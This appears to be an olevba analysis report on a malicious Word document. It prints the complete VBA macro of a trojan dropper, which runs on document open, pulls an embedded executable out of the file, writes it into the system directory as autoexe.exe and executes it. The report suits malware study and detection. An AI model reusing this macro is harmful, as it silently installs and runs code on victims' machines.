olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Trojan-Dropper.MSWord.Richtemp.a-c0d66cfa7a12cd73c34dcc2fe0869cefe9bdd853
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Trojan-Dropper.MSWord.Richtemp.a-c0d66cfa7a12cd73c34dcc2fe0869cefe9bdd853 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


Private Sub Document_Open()
Module1.abc
End Sub
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: Trojan-Dropper.MSWord.Richtemp.a-c0d66cfa7a12cd73c34dcc2fe0869cefe9bdd853 - OLE stream: 'Macros/VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Compare Text

Public Declare Function CreateFile Lib "kernel32" Alias "CreateFileA" (ByVal lpFileName As String, ByVal dwDesiredAccess As Long, ByVal dwShareMode As Long, ByVal lpSecurityAttributes As Long, ByVal dwCreationDistribution As Long, ByVal dwFlagsAndAttributes As Long, ByVal hTemplate As Long) As Long
Public Declare Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long
Public Declare Function ReadFile Lib "kernel32" (ByVal hFile As Long, lpBuffer As Byte, ByVal dwNumberOfBytesToRead As Long, lpNumberOfBytesRead As Long, ByVal lpOverlapped As Long) As Long
Public Declare Function WriteFile Lib "kernel32" (ByVal hFile As Long, lpBuffer As Byte, ByVal dwNumberOfBytesToWrite As Long, lpNumberOfBytesWritten As Long, ByVal lpOverlapped As Long) As Long
Public Declare Function SetFilePointer Lib "kernel32" (ByVal hFile As Long, ByVal lDistanceToMove As Long, ByVal lpDistanceToMoveHigh As Long, ByVal dwMoveMethod As Long) As Long
Public Declare Function GetSystemDirectory Lib "kernel32" Alias "GetSystemDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
Public Declare Function SetCurrentDirectory Lib "kernel32" Alias "SetCurrentDirectoryA" (ByVal lpBuffer As String) As Boolean
Declare Function GetFileSize Lib "kernel32" (ByVal hFile As Long, lpFileSizeHigh As Long) As Long

Public Const GENERIC_READ As Long = &H80000000
Public Const GENERIC_WRITE As Long = &H40000000
Public Const FILE_SHARE_READ As Long = 1
Public Const FILE_SHARE_WRITE As Long = 2
Public Const CREATE_NEW As Long = 1
Public Const CREATE_ALWAYS As Long = 2
Public Const OPEN_EXISTING As Long = 3
Public Const OPEN_ALWAYS As Long = 4
Public Const TRUNCATE_EXISTING As Long = 5
Public Const INVALID_HANDLE_VALUE As Long = -1
Public Const FILE_ATTRIBUTE_NORMAL As Long = &H80

Public Function abc()


On Error Resume Next
   Dim buffer(65536) As Byte
   Dim h, h2, j, i, k As Long
   Dim sSave As String
   Dim Ret As Long
   Dim Border As Long
   Dim Data(8) As Byte
   Dim FileSize As Long
   Dim Tmp As Byte
   
   
   
    sSave = Space(255)
    Ret = GetSystemDirectory(sSave, 255)
    sSave = Left$(sSave, Ret)
    pathst = sSave & "\autoexe.exe"

   
   h = CreateFile(Application.ActiveDocument.FullName, GENERIC_READ, FILE_SHARE_READ + FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0)
   h2 = CreateFile(pathst, GENERIC_WRITE, 0, 0, CREATE_ALWAYS, 0, 0)
   If h = INVALID_HANDLE_VALUE Then
      Exit Function
   End If
        
   FileSize = GetFileSize(h, Border)
   Border = 1
  
   Do
        For i = 1 To 7
            Data(i) = Data(i + 1)
        Next i
        i = ReadFile(h, Tmp, 1, j, 0)
        Data(8) = Tmp
         
        If (Data(1) = &H4D And Data(2) = &H5A) Then ' And Data(3) = &H90 And Data(4) = &H0 And Data(5) = &H3 And Data(6) = &H0 And Data(7) = &H0 And Data(8) = &H0) Then
            Exit Do
        End If
        
        Border = Border + 1
        
   Loop While Border < FileSize
   
   k = SetFilePointer(h, Border - 8, nil, 0)
   Do
      i = ReadFile(h, buffer(0), 65536, j, 0)
      i = WriteFile(h2, buffer(0), j, j, 0)
   Loop Until j < 65536
   
   CloseHandle (h)
   CloseHandle (h2)
    
    j = 0
    Do
     SetCurrentDirectory (sSave)
     j = j + 1
    Loop Until j < 10
    
   Shell (pathst)
   
End Function



+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |autoexe.exe         |Executable file name                         |
+----------+--------------------+---------------------------------------------+

